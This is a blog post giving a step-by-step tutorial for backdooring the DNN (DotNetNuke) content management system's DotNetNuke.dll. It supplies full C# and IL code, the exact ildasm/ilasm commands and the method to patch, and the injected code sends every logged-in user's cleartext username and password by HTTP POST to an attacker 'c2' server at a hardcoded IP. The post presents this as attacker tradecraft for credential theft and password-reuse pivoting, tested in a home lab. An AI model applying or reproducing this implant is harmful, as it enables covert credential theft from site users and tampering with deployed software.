---
layout: posts
title: "Backdooring Dotnet Applications"
date: 2024-04-19 00:00:00 -0600
categories: backdooring dotnet
author: Nicholas Starke
---

## tl;dr

This blog post presents a very manual approach to modifying application code.  If you don't have time to read and learn, I direct you to: [DnSpyEx](https://github.com/dnSpyEx/dnSpy).  Happy Hacking!

## Background

In my [previous blog post](/reverse-engineering/dotnet/2024/04/18/reverse-engineering-dotnet-applications.html) I went through the tooling required for reverse engineering dotnet applications.  I recommend reading through that blog post before tackling this one, especially if you are unfamiliar with `ilasm` and `ildasm`.

## Introduction

Today we are going to look at how to backdoor a dotnet application.  Let's define what that means.  We want to introduce new functionality into an existing dotnet application or dll without any application errors.  

To accomplish this goal, I chose an open source dotnet application to use as a demonstration.  I chose `DNN` ([https://github.com/dnnsoftware/Dnn.Platform](https://github.com/dnnsoftware/Dnn.Platform)), which is an open source Content Management System built in dotnet. As an open source project, the application code is available for all to read and modify.  However, the techniques I am going to teach you here do not rely at all on having the source code; the only prerequisite is having access to the binary application/dll, the ability to swap out the dll on the webserver, and the ability to restart IIS.

What is the functionality we intend to introduce? Well as good attackers, we want something useful for us to advance against our objectives.  For this demonstration, I chose introducing the capability of sending the valid login credentials of every authenticated user to a remote server via HTTP.  I plugged this function into the application binary instructions responsible for handling successful authentication attempts.  

Why chose this functionality?  Passwords in CMS systems, as well as most well-constructed dotnet applications, are stored after being passed through a one way hash function.  That way if an attacker is able to pop the database, they aren't able to recover the password directly.  But, if we can capture the credentials as they move through memory, before they touch disk, we can pilfer the unhashed clear text credentials.  Recovering application credentials can be very useful for gaining further access due to password reuse.  

## Test Environment

When trying to modify binary applications without source code, it is always very important to have a reliable test environment.  I have a VM with a licensed version of Windows 11 in it that I use for tasks like this.  I downloaded version `9.13.3` of `DNN` from [https://github.com/dnnsoftware/Dnn.Platform/releases/tag/v9.13.3](https://github.com/dnnsoftware/Dnn.Platform/releases/tag/v9.13.3).  `9.13.3` is the latest version as of this writing.  

I unzipped the release zip file into `C:\DNN9`.  I also had to install [SQLExpress](https://www.microsoft.com/en-us/download/details.aspx?id=101064) and [SQL Server Management Studio](https://learn.microsoft.com/en-us/sql/ssms/download-sql-server-management-studio-ssms?view=sql-server-ver16) (`SSMS`) and modify the `web.config` file in `C:\DNN9` to point to my local `SQLExpress` SQL Server Database instead of relying on the `Database.mdf` file located in `C:\DNN9\App_data`.  I used SSMS to query the `Exceptions` table in the `DnnDB` to troubleshoot application errors I received while debugging my backdoor.  DNN does not display error messages with stack traces to web users upon exception; it logs them into this table for persistence.

The specific configuration setup is not relevent to this blog post, but good instructions to get started can be found here: [https://www.dnnsoftware.com/docs/developers/setup/index.html](https://www.dnnsoftware.com/docs/developers/setup/index.html)

## Creating the Backdoor Code/Instructions

To add functionality to an application in binary form requires manipulating the binary disassembly directly, then reassembling the modified disassembly back into pure binary .NET CLR bytecode.  This requires us to inject the code we hope to modify the original application with into the disassembly.  Instead of trying to hand write large amounts of disassembly by hand, I usually start by creating a Windows C# .NET Console Application in Visual Studio.  From there, I write a function that takes as argument the data I wish to exfiltrate to a remote server, and then call that function from the `main` function passing in hardcoded variables to the function invocation.  

![](/images/04192024/visual-studio-custom-function.png)

The source code for my `CustomFunction` and Console Application:

```csharp
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Security.Policy;
using System.Text;
using System.Threading.Tasks;

namespace DnnReConsoleApp
{
    internal class Program
    {
        static void Main(string[] args)
        {
            string username = "bogus";
            string password = "bogus2";
            CustomFunction(username, password);
        }

        static void CustomFunction(string username, string password)
        {
            using (var wb = new WebClient())
            {
                var data = new NameValueCollection();
                data["username"] = username;
                data["password"] = password;

                var response = wb.UploadValues("http://192.168.50.114:3000/creds", "POST", data);
                string responseInString = Encoding.UTF8.GetString(response);
            }

        }
    }
}
```

I compile this application and then disassemble it with `ildasm` by running:

```
ildasm /out=DnnReConsoleApp.il DnnReConsoleApp.exe
```

Which produces the following bytecode disassembly:

```

//  Microsoft (R) .NET Framework IL Disassembler.  Version 4.8.3928.0
//  Copyright (c) Microsoft Corporation.  All rights reserved.



// Metadata version: v4.0.30319
.assembly extern mscorlib
{
  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 )                         // .z\V.4..
  .ver 4:0:0:0
}
.assembly extern System
{
  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 )                         // .z\V.4..
  .ver 4:0:0:0
}
.assembly DnnReConsoleApp
{
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilationRelaxationsAttribute::.ctor(int32) = ( 01 00 08 00 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Runtime.CompilerServices.RuntimeCompatibilityAttribute::.ctor() = ( 01 00 01 00 54 02 16 57 72 61 70 4E 6F 6E 45 78   // ....T..WrapNonEx
                                                                                                             63 65 70 74 69 6F 6E 54 68 72 6F 77 73 01 )       // ceptionThrows.

  // --- The following custom attribute is added automatically, do not uncomment -------
  //  .custom instance void [mscorlib]System.Diagnostics.DebuggableAttribute::.ctor(valuetype [mscorlib]System.Diagnostics.DebuggableAttribute/DebuggingModes) = ( 01 00 07 01 00 00 00 00 ) 

  .custom instance void [mscorlib]System.Reflection.AssemblyTitleAttribute::.ctor(string) = ( 01 00 0F 44 6E 6E 52 65 43 6F 6E 73 6F 6C 65 41   // ...DnnReConsoleA
                                                                                              70 70 00 00 )                                     // pp..
  .custom instance void [mscorlib]System.Reflection.AssemblyDescriptionAttribute::.ctor(string) = ( 01 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Reflection.AssemblyConfigurationAttribute::.ctor(string) = ( 01 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Reflection.AssemblyCompanyAttribute::.ctor(string) = ( 01 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Reflection.AssemblyProductAttribute::.ctor(string) = ( 01 00 0F 44 6E 6E 52 65 43 6F 6E 73 6F 6C 65 41   // ...DnnReConsoleA
                                                                                                70 70 00 00 )                                     // pp..
  .custom instance void [mscorlib]System.Reflection.AssemblyCopyrightAttribute::.ctor(string) = ( 01 00 12 43 6F 70 79 72 69 67 68 74 20 C2 A9 20   // ...Copyright .. 
                                                                                                  20 32 30 32 34 00 00 )                            //  2024..
  .custom instance void [mscorlib]System.Reflection.AssemblyTrademarkAttribute::.ctor(string) = ( 01 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Runtime.InteropServices.ComVisibleAttribute::.ctor(bool) = ( 01 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Runtime.InteropServices.GuidAttribute::.ctor(string) = ( 01 00 24 33 32 32 30 36 39 65 33 2D 62 36 33 62   // ..$322069e3-b63b
                                                                                                  2D 34 65 32 39 2D 61 64 32 65 2D 33 35 33 31 34   // -4e29-ad2e-35314
                                                                                                  33 63 64 38 31 38 61 00 00 )                      // 3cd818a..
  .custom instance void [mscorlib]System.Reflection.AssemblyFileVersionAttribute::.ctor(string) = ( 01 00 07 31 2E 30 2E 30 2E 30 00 00 )             // ...1.0.0.0..
  .custom instance void [mscorlib]System.Runtime.Versioning.TargetFrameworkAttribute::.ctor(string) = ( 01 00 1A 2E 4E 45 54 46 72 61 6D 65 77 6F 72 6B   // ....NETFramework
                                                                                                        2C 56 65 72 73 69 6F 6E 3D 76 34 2E 38 01 00 54   // ,Version=v4.8..T
                                                                                                        0E 14 46 72 61 6D 65 77 6F 72 6B 44 69 73 70 6C   // ..FrameworkDispl
                                                                                                        61 79 4E 61 6D 65 12 2E 4E 45 54 20 46 72 61 6D   // ayName..NET Fram
                                                                                                        65 77 6F 72 6B 20 34 2E 38 )                      // ework 4.8
  .hash algorithm 0x00008004
  .ver 1:0:0:0
}
.module DnnReConsoleApp.exe
// MVID: {7472C02C-0AE8-4CA6-A7A8-49F6F0936D7F}
.imagebase 0x00400000
.file alignment 0x00000200
.stackreserve 0x00100000
.subsystem 0x0003       // WINDOWS_CUI
.corflags 0x00020003    //  ILONLY 32BITPREFERRED
// Image base: 0x06DB0000


// =============== CLASS MEMBERS DECLARATION ===================

.class private auto ansi beforefieldinit DnnReConsoleApp.Program
       extends [mscorlib]System.Object
{
  .method private hidebysig static void  Main(string[] args) cil managed
  {
    .entrypoint
    // Code size       22 (0x16)
    .maxstack  2
    .locals init ([0] string username,
             [1] string password)
    IL_0000:  nop
    IL_0001:  ldstr      "bogus"
    IL_0006:  stloc.0
    IL_0007:  ldstr      "bogus2"
    IL_000c:  stloc.1
    IL_000d:  ldloc.0
    IL_000e:  ldloc.1
    IL_000f:  call       void DnnReConsoleApp.Program::CustomFunction(string,
                                                                      string)
    IL_0014:  nop
    IL_0015:  ret
  } // end of method Program::Main

  .method private hidebysig static void  CustomFunction(string username,
                                                        string password) cil managed
  {
    // Code size       85 (0x55)
    .maxstack  4
    .locals init ([0] class [System]System.Net.WebClient wb,
             [1] class [System]System.Collections.Specialized.NameValueCollection data,
             [2] uint8[] response,
             [3] string responseInString)
    IL_0000:  nop
    IL_0001:  newobj     instance void [System]System.Net.WebClient::.ctor()
    IL_0006:  stloc.0
    .try
    {
      IL_0007:  nop
      IL_0008:  newobj     instance void [System]System.Collections.Specialized.NameValueCollection::.ctor()
      IL_000d:  stloc.1
      IL_000e:  ldloc.1
      IL_000f:  ldstr      "username"
      IL_0014:  ldarg.0
      IL_0015:  callvirt   instance void [System]System.Collections.Specialized.NameValueCollection::set_Item(string,
                                                                                                              string)
      IL_001a:  nop
      IL_001b:  ldloc.1
      IL_001c:  ldstr      "password"
      IL_0021:  ldarg.1
      IL_0022:  callvirt   instance void [System]System.Collections.Specialized.NameValueCollection::set_Item(string,
                                                                                                              string)
      IL_0027:  nop
      IL_0028:  ldloc.0
      IL_0029:  ldstr      "http://192.168.50.114:3000/creds"
      IL_002e:  ldstr      "POST"
      IL_0033:  ldloc.1
      IL_0034:  callvirt   instance uint8[] [System]System.Net.WebClient::UploadValues(string,
                                                                                       string,
                                                                                       class [System]System.Collections.Specialized.NameValueCollection)
      IL_0039:  stloc.2
      IL_003a:  call       class [mscorlib]System.Text.Encoding [mscorlib]System.Text.Encoding::get_UTF8()
      IL_003f:  ldloc.2
      IL_0040:  callvirt   instance string [mscorlib]System.Text.Encoding::GetString(uint8[])
      IL_0045:  stloc.3
      IL_0046:  nop
      IL_0047:  leave.s    IL_0054

    }  // end .try
    finally
    {
      IL_0049:  ldloc.0
      IL_004a:  brfalse.s  IL_0053

      IL_004c:  ldloc.0
      IL_004d:  callvirt   instance void [mscorlib]System.IDisposable::Dispose()
      IL_0052:  nop
      IL_0053:  endfinally
    }  // end handler
    IL_0054:  ret
  } // end of method Program::CustomFunction

  .method public hidebysig specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       8 (0x8)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  nop
    IL_0007:  ret
  } // end of method Program::.ctor

} // end of class DnnReConsoleApp.Program


// =============================================================

// *********** DISASSEMBLY COMPLETE ***********************
// WARNING: Created Win32 resource file DnnReConsoleApp.res
```

A few things to note about this program:

1) To avoid having to drop additional dll libraries onto the target website, I chose to use the `Newtonsoft.Json` JSON library as it was already included in DNN by default.  

2) The application makes a HTTP POST request containing the login credentials to a hardcoded IP address running elsewhere as our remote capture server (`c2`).

![](/images/04192024/vscode-ildasm-output.png)

## Identifying the insertion point

We need to find the right location in our target application to insert the custom functionality as well as where to call our `CustomFunction` from.  There are a lot of .NET Decompilers out there; the last blog post used [ILSpy](icsharpcode) (also open source and available on the Microsoft Store).  For this blog post I am going to use [Dotpeek](https://www.jetbrains.com/decompiler/).  There are many others; I encourage you to try as many of them as you can to decide which fits your work flow best.

I was able to identify the code location I wanted to call my `CustomFunction` from by using `DotPeek` to peruse the binary dll file.

![](/images/04192024/dotpeek-insertion-point.png)

The `CheckInsecurePassword` method is located in the `DotNetNuke.dll` file. In C# terms, it lives in the namespace `DotNetNuke.Entities.Users.UserController`.

I chose the end of the `CheckInsecurePassword` function to insert the method invocation to my `CustomFunction` for a few reaqsons:

1) This method does not return a value (return type `void` in C#)
2) It is called on every successful authentication check as far as I can tell.
3) It has the data I want to steal as argument parameters.

## Disassembling the Original DLL

I used the following command to disassemble `DotNetNuke.dll`:

```
ildasm /dll /out=DotNetNuke.il DotNetNuke.dll
```

An important thing to note is that `ildasm` creates a `DotNetNuke.res` file upon successful disassembly.  This file will become very important later.

Now that we have our disassembly, we can begin modifying the disassembly to include both our `CustomFunction` and the invocation of it.

## Modifying the Disassembly

The Disassembly for the `DotNetNuke.dll` is 600,000+ lines long, so I won't include it in its entirety here.  If you're interested, I posted a copy of the modified Disassembly file [here](/text/04192024/DotNetNuke.il).  For this blog post, I will focus on the insertion point for the `CustomFunction` method and the insertion point for calling this custom function.

For the first, I chose to include the function in `DotNetNuke.Entities.Users.UserController`.  You can find this class by searching for this string in `DotNetNuke.il`:

```
.class public auto ansi beforefieldinit DotNetNuke.Entities.Users.UserController
```

I identified the class by using this VSCode Search Term (with regex enabled):

```
\.class.*DotNetNuke.Entities.Users.UserController
```

![](/images/04192024/vscode-search.png)

I inserted the disassembled method right after `UserController::GetDuplicateEmailCount`.  You can find this location by searching for the following string:

```
} // end of method UserController::GetDuplicateEmailCount
```

I changed the method signature to

```
.method public hidebysig static void
```

From:

```
.method private hidebysig static void 
```

So I could call the `CustomFunction` externally if necessary.  It ended up not being necessary to pull the full attack off, but its something to consider if you're making calls to other assemblies.

That takes care of inserting the `CustomFunction` method.  How about calling it now?

I wanted to add the invocation at the end of the function, so I chose to add it after the disassembly would normally end:

```
IL_004f:  brfalse.s  IL_0054
IL_0051:  ldarg.2
IL_0052:  ldc.i4.6
IL_0053:  stind.i4
IL_0054:  ret
```

I added this handwritten disassembly:

```
IL_0054:  ldarg.0
IL_0055:  ldarg.1
IL_0056:  call void DotNetNuke.Entities.Users.UserController::CustomFunction(string, string)
IL_005A:  nop
IL_005b:  ret
```

Note that the `ret` bytecode instruction had to be modified from `IL_0054:  ret` to `IL_005b:  ret`

## Reassembling

After we insert our method and invocation, we need to reassemble our `DotNetNuke.dll` from the modified `DotNetNuke.il`.  We can do that by running the following command:

```
ilasm /dll /out=DotNetNuke.dll /resource=DotNetNuke.res DotNetNuke.il
```

This is where that resource file comes in.  On disassembly, `ildasm` creates a `.res` file containing Assembly version information and other metadata.  `DNN` uses the data in this file in its start up code, and if it doesn't exist you will be granted with an ASP.NET Runtime Error if you don't include it when reassembling. That might be specific to `DNN` but it will probably also matter for whatever dll/exe you are targeting.

## Setting up the C2

I went out to another host on my network that runs an ubuntu image and downloaded this python3 script:

[https://gist.github.com/mdonkers/63e115cc0c79b4f6b8b3a6b797e485c7](https://gist.github.com/mdonkers/63e115cc0c79b4f6b8b3a6b797e485c7) 

I ran this script on port `3000`.  Note that the IP Address in this case of my "c2" was `192.168.50.114` which corresponds to the URL for the web request in `CustomFunction`.  

## Does it work?

I access my local installation of `DNN` using a web browser, and I log in using my authentication credentials.  This is what I see on my C2 output:

![](/images/04192024/c2-receive-creds.png)

Success!